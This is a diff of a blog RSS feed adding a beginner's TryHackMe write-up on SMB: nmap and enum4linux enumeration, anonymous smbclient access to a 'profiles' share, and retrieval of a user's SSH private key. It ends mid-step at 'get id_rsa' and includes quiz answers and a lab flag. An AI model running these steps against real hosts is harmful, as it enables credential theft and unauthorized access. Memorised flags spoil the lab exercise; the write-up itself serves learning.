@@ -1,15 +1,1058 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
   <channel>
-    <title>leewook</title>
+    <title>Wook&#39;s blog</title>
     <link>http://localhost:1313/</link>
-    <description>Recent content on leewook</description>
+    <description>Recent content on Wook&#39;s blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
     <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
     <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
-    <lastBuildDate>Tue, 18 Jun 2024 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 24 Jun 2024 00:00:00 +0000</lastBuildDate>
     <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>[THM] Network Services</title>
+      <link>http://localhost:1313/thm-network-services/</link>
+      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
+      <guid>http://localhost:1313/thm-network-services/</guid>
+      <description>I have been indecisive about choosing between TryHackMe and Hack The Box Academy. Both are great platforms for learning about cybersecurity, and I plan to use both. However, I think TryHackMe is more suitable for absolute beginners like me. While exploring their Network Services rooms, I found myself learning a lot, so I decided to make a post about them.
+SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</description>
+      <content:encoded><![CDATA[<p>I have been indecisive about choosing between TryHackMe and Hack The Box Academy. Both are great platforms for learning about cybersecurity, and I plan to use both. However, I think TryHackMe is more suitable for absolute beginners like me. While exploring their Network Services rooms, I found myself learning a lot, so I decided to make a post about them.</p>
+<div style="text-align: center"><img src="./cat-hack.gif"></div>
+<h3 id="smb-server-message-block-protocol">SMB (Server Message Block) Protocol</h3>
+<hr>
+<h4 id="understanding-smb">Understanding SMB</h4>
+<p>What does SMB stand for?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Server Message Block</code></pre>
+</br>
+<p>What type of protocol is SMB?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>resposne-request</code></pre>
+</br>
+<p>What do clients connect to servers using?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>TCP/IP</code></pre>
+<br>
+<p>What systems does Samba run on?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Unix</code></pre>
+<h4 id="enumerating-smb">Enumerating SMB</h4>
+<p>Conduct an <strong>nmap</strong> scan of your choosing, How many ports are open?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>3</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-210-52:~# nmap 10.10.190.95
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-24 05:55 BST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-190-95.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.190.95<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00047s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">997</span> closed ports
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp  open  ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>MAC Address: 02:58:19:9C:D2:BD <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 1.76 seconds</span></span></code></pre></div>
+<br>
+<p>What port is SMB running on?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>139/445</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-210-52:~# nmap -sV 10.10.190.95
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-24 05:57 BST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-190-95.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.190.95<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00042s latency<span style="color:#89dceb;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">997</span> closed ports
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT    STATE SERVICE     VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>MAC Address: 02:58:19:9C:D2:BD <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 13.04 seconds</span></span></code></pre></div>
+<br>
+<p>Let&rsquo;s get started with <strong>Enum4Linux</strong>, conduct a full basic enumeration. For starters, what is the <strong>workgroup</strong> name?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>WORKGROUP</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-210-52:~# enum4linux -a 10.10.190.95</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>	Server               Comment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>	---------            -------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>	Workgroup            Master
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
+<br>
+<p>What comes up as the <strong>name</strong> of the machine?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>POLOSMB</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>	Server               Comment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>	---------            -------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>	Workgroup            Master
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
+<br>
+<p>What operating system <strong>version</strong> is running?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>6.1</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span> <span style="color:#89dceb;font-weight:bold">======================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>|    OS information on 10.10.190.95    |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> <span style="color:#89dceb;font-weight:bold">======================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Use of uninitialized value <span style="color:#f5e0dc">$os_info</span> in concatenation <span style="color:#89dceb;font-weight:bold">(</span>.<span style="color:#89dceb;font-weight:bold">)</span> or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Got OS info <span style="color:#cba6f7">for</span> 10.10.190.95 from smbclient:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Got OS info <span style="color:#cba6f7">for</span> 10.10.190.95 from srvinfo:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server <span style="color:#89dceb;font-weight:bold">(</span>Samba, Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>	platform_id     :	<span style="color:#fab387">500</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>	os version      :	6.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	server <span style="color:#89dceb">type</span>     :	0x809a03</span></span></code></pre></div>
+<br>
+<p>What share sticks out as something we might want to investigate?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>profiles</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span> <span style="color:#89dceb;font-weight:bold">=========================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>|    Share Enumeration on 10.10.190.95    |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> <span style="color:#89dceb;font-weight:bold">=========================================</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>WARNING: The <span style="color:#a6e3a1">&#34;syslog&#34;</span> option is deprecated
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>	Sharename       Type      Comment
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>	---------       ----      -------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>	netlogon        Disk      Network Logon Service
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>	profiles        Disk      Users profiles
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	print$          Disk      Printer Drivers
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>	IPC$            IPC       IPC Service <span style="color:#89dceb;font-weight:bold">(</span>polosmb server <span style="color:#89dceb;font-weight:bold">(</span>Samba, Ubuntu<span style="color:#89dceb;font-weight:bold">))</span></span></span></code></pre></div>
+<br>
+<h4 id="exploiting-smb">Exploiting SMB</h4>
+<p>What would be the correct syntax to access an SMB share called &ldquo;secret&rdquo; as user &ldquo;suit&rdquo; on a machine with the IP 10.10.10.2 on the default port?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>smbclient //10.10.10.2/secret -U suit -p 445</code></pre>
+<p>We can remotely access the SMB share using the syntax:
+<strong>smbclient //[IP]/[SHARE]</strong> followed by the tags:
+-U [name]: to specify the user
+-p [port]: to specify the port
+SMB default ports are <strong>139 or 445</strong></p>
+<br>
+<p>Let&rsquo;s see if our interesting share has been configured to allow anonymous access, i,e it doesn&rsquo;t require authentication to view the files. We can do this easily by:</p>
+<ul>
+<li>using the username &ldquo;Anonymous&rdquo;</li>
+<li>connecting to the share we found during the enumeration stage</li>
+<li>and not supplying a password.</li>
+</ul>
+<p>Does the share allow anonymous access? Y/N?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>Y</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-210-52:~# smbclient //10.10.190.95/profiles -U Anonymous
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>WARNING: The <span style="color:#a6e3a1">&#34;syslog&#34;</span> option is deprecated
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Enter WORKGROUP<span style="color:#89b4fa">\A</span>nonymous<span style="color:#f38ba8">&#39;</span>s password:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Try <span style="color:#a6e3a1">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>smb: <span style="color:#89b4fa">\&gt;</span></span></span></code></pre></div>
+<br>
+<p>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>John Cactus</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>smb: &gt; more <span style="color:#a6e3a1">&#34;Working From Home Information.txt&#34;</span>John Cactus,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>As you<span style="color:#f38ba8">&#39;</span>re well aware, due to the current pandemic most of POLO inc. has insisted that, wherever
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>possible, employees should work from home. As such- your account has now been enabled with ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>access to the main server.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>If there are any problems, please contact the IT department at it@polointernalcoms.uk
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Regards,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>James
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Department Manager
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>/tmp/smbmore.aObMlQ <span style="color:#89dceb;font-weight:bold">(</span>END<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>
+<br>
+<p>What service has been configured to allow him to work from home?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>ssh</code></pre>
+<br>
+<p>Okay! Now we know this, what directory on the share should we look in?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>.ssh</code></pre>
+<br>
+<p>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>id_rsa</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>smb: <span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">cd</span> .ssh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>smb: <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\&gt;</span> ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>  .                                   D        <span style="color:#fab387">0</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>  ..                                  D        <span style="color:#fab387">0</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>  id_rsa                              A     <span style="color:#fab387">1679</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>  id_rsa.pub                          N      <span style="color:#fab387">396</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>  authorized_keys                     N        <span style="color:#fab387">0</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>		<span style="color:#fab387">12316808</span> blocks of size 1024. <span style="color:#fab387">7583712</span> blocks available</span></span></code></pre></div>
+<br>
+<p>Download this file to your local machine, and change the permissions to &ldquo;600&rdquo; using &ldquo;chmod 600 [file]&rdquo;.</p>
+<p>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.</p>
+<p>What is the smb.txt flag?</p>
+
+
+
+
+
+
+<pre tabindex="0"><code>THM{smb_is_fun_eh?}</code></pre>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>smb: <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\&gt;</span> get id_rsa
